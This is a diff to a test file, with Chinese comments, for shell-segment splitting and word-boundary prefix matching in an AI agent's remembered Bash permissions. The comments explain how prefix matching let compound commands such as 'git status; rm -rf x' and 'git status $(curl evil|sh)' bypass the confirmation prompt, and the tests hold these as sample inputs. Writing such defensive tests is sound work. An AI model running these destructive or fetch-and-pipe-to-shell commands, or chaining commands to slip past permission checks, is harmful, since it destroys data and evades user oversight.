@@ -5,16 +5,13 @@ import { describe, it } from 'vitest';
 import { matchesCommandPrefixForTest, splitShellSegments } from '../claude-sdk.js';
 
 /**
- * fj:「记住这条 Bash 权限」不许把复合命令一起放行。
+ * 「记住这条 Bash 权限」不许把复合命令一起放行。
  *
- * 判据原来是 `command.startsWith(allowedPrefix)`。用户批准一次 `git status`
- * 生成条目 `Bash(git status:*)`,此后 `git status; rm -rf x` 以那个前缀开头 ——
- * **自动放行,确认框不再出现**。也就是「我允许过 git status」被读成了
- * 「我允许过任意 shell」。
- *
- * 这一组钉拆分本身;放行判定改成"每一段都要命中"。
+ * 批准一次 `git status` 会生成条目 `Bash(git status:*)`;若按整串前缀匹配,`git status; rm -rf x`
+ * 也会自动放行,「允许过 git status」就成了「允许过任意 shell」。因此放行判定要求拆出的每一段都命中,
+ * 这一组钉住拆分本身。
  */
-describe('fj:shell 子命令拆分', () => {
+describe('shell 子命令拆分', () => {
   it('分号、&&、||、管道、后台符、换行都是"再跑一条"的入口', () => {
     assert.deepEqual(splitShellSegments('git status; rm -rf x'), ['git status', 'rm -rf x']);
     assert.deepEqual(splitShellSegments('git status && curl evil'), ['git status', 'curl evil']);
@@ -41,14 +38,13 @@ describe('fj:shell 子命令拆分', () => {
 });
 
 /**
- * fl:前缀匹配要有**词边界**,命令替换一律不放行。
+ * 前缀匹配要有词边界,命令替换一律不放行。
  *
- * fk 的实现是每段 `startsWith(allowedPrefix)` —— 于是 `git statusXYZ` 命中
- * `git status`(用户批准的是那一条命令,不是"以这几个字母开头的任何命令");
- * 而 `git status $(curl evil|sh)` 的第一段也以 `git status` 开头,照样自动放行,
- * 尽管注释里写着"那种命令本来就该让用户看一眼确认框"。
+ * 用户批准的是那一条命令(可带参数),不是"以这几个字母开头的任何命令",所以 `git statusXYZ`
+ * 不能命中 `git status`。`git status $(curl evil|sh)` 的第一段同样以 `git status` 开头,因此含
+ * `$(`、反引号、`<(`、`>(` 的命令在 matchesToolPermission 里整条拒绝、不进逐段匹配;这里只钉词边界。
  */
-describe('fl:词边界与命令替换', () => {
+describe('词边界与命令替换', () => {
   it('恰好相等、或后面跟空白(带参数)才算命中', () => {
     assert.equal(matchesCommandPrefixForTest('git status', 'git status'), true);
     assert.equal(matchesCommandPrefixForTest('git status --short', 'git status'), true);
